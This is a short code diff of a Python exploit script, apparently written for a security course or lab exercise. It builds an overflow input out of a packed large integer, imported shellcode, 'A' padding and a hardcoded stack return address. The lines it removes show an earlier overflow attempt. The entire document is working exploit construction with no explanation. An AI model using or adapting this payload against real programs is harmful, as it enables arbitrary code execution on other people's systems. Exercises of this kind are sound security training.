@@ -1,5 +1,6 @@
-#!/usr/bin/python
-
 from shellcode import shellcode
-#print (shellcode+"A"*2025+"\x08\xae\xfe\xbf"+"\x1c\xb6\xfe\xbf")
-print ("\x08\x00\x00\x00"+"A"*32)
+import struct
+
+x = struct.pack('<I', 1073741825)
+
+print(x + shellcode +"A"*37 + "\xe0\xb5\xfe\xbf")
